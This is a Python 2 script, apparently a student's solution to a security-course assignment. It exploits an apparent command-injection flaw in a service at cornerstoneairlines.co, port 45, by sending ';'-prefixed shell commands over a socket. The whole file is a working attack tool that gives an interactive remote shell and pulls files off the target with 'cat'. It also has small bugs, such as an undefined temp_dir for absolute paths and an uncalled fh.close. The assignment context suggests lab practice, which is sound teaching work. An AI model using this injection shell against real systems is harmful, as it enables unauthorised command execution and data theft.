"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def usage():
	print("shell Drop into an interactive shell and allow users to gracefully exit")
	print("pull  <remote-path> <local-path> Download files")
	print("help  Shows this help menu")
	print("quit  Quit the shell")

def execute_cmd(cmd_args, directory = None):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	if(directory is not None):
		s.send(";" + "cd " + directory + ";"+ cmd_args + "\n")
	else:
		s.send(";" + cmd_args + "\n")
	s.recv(1024)
	data = s.recv(1024)
	
	s.close()
	return data

if __name__ == '__main__':
	directory = "/"
	exit = True
	shell = False
	while exit:
		print(">"),

		input = raw_input()
		pull_request = input.split(' ')

		if(input == "shell"):
			shell = True
		elif(input == "quit"):
			exit = False
		elif(input == "help"):
			usage()
		elif(pull_request[0] == "pull" and len(pull_request) == 3):
			#check if file exists on remote and write to file on local
			if(execute_cmd("if [ -f " + pull_request[1] + " ]; then echo true; fi", "/") == "true\n"):
				fh = open(pull_request[2], 'w')
				fh.write(execute_cmd("cat " + pull_request[1]))
				fh.close
			else:
				print("remote-path not found")
		else:
			usage()

		while shell:

			print(directory + ">"),

			input = raw_input()
			cmd_args = input.split(' ')

			if(cmd_args[0] == "cd" and len(cmd_args) == 2):

				dir_parts = cmd_args[1].split('/')
				#check for ./ or ../
				if(cmd_args[1][0:1] != '/'):
					temp_dir = directory.split('/')

				for x in range(len(dir_parts)):
					if(dir_parts[x] == ".."):
						temp_dir.pop()
					else:
						temp_dir.append(dir_parts[x])

				temp_dir_str = ""
				for x in range(len(temp_dir)):
					if(temp_dir[x] != ''):
						temp_dir_str = temp_dir_str + "/" + temp_dir[x]
				#check if directory exists
				if(execute_cmd("if [ -d " + temp_dir_str + " ]; then echo true; fi", "/") == "true\n"):
					if(temp_dir_str != ""):
						directory = temp_dir_str
					else:
						directory = "/"
				else:
					print("Directory does not exist")
			elif(cmd_args[0] == "quit"):
				shell = False
			else:
				print(execute_cmd(input, directory))
